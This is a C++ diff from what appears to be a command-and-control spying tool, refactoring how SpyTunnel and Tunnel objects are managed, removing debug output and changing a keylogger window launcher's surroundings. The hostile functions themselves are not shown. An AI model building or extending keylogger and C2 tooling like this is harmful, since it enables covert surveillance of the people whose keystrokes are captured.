@@ -92,7 +92,6 @@ void SpyTunnel::run() {
                     write(tunnel_fifo_, RESET_C2_FIFO, strlen(RESET_C2_FIFO));
                     close(tunnel_fifo_);
                 }
-                std::cout << MAGENTA << "[SpyTunnel::run] Shutdown signal received" << RESET;
                 return;
             }
         }
@@ -124,31 +123,28 @@ void Keylogger::spawn_window() {
     execlp("urxvt", "urxvt", "-name", "stierlitz_keylogger", "-e", KEYLOGGER_SCRIPT_PATH, (char*)NULL);
 }
 
-Tunnel::Tunnel(CommandCode __command_code, int __client_index, SpyTunnel* __p_spy_tunnel) {
+Tunnel::Tunnel(int __client_index, CommandCode __command_code, SpyTunnel* __p_spy_tunnel) {
     command_code_ = __command_code;
     client_index_ = __client_index;
     p_spy_tunnel_ = __p_spy_tunnel;
     p_tunnel_shutdown_fd_ = nullptr;
 }
 
-void erase_tunnel(std::vector<Tunnel>* __p_tunnels, int __client_index, CommandCode __command_code) {
-    std::cout << MAGENTA << "[erase_tunnel] Erasing tunnel for client " << __client_index << " with command code " << static_cast<int>(__command_code) << RESET;
-    std::cout << MAGENTA << "[erase_tunnel] Address of tunnels: " << __p_tunnels << RESET;
-
+void erase_tunnel(std::vector<Tunnel*>* __p_tunnels, int __client_index, CommandCode __command_code) {
     auto it = std::remove_if(
         __p_tunnels->begin(), 
         __p_tunnels->end(),
-        [=](Tunnel& tunnel) {
-            bool should_erase = (tunnel.client_index_ == __client_index && tunnel.command_code_ == __command_code); 
+        [=](Tunnel* tunnel) {
+            bool should_erase = (tunnel->client_index_ == __client_index && tunnel->command_code_ == __command_code); 
             if (should_erase) {
-                std::cout << MAGENTA << "[erase_tunnel] Address of spy tunnel: " << tunnel.p_spy_tunnel_ << RESET;
-                delete tunnel.p_spy_tunnel_;
+                delete tunnel->p_spy_tunnel_;
+                delete tunnel;
             }
             return should_erase;
         }
     );
 
-    __p_tunnels->erase(it, __p_tunnels->end());
+    __p_tunnels->erase(it, __p_tunnels->end()); // Reorganize the vector
 }
 
 void SpyTunnel::spawn_window() {
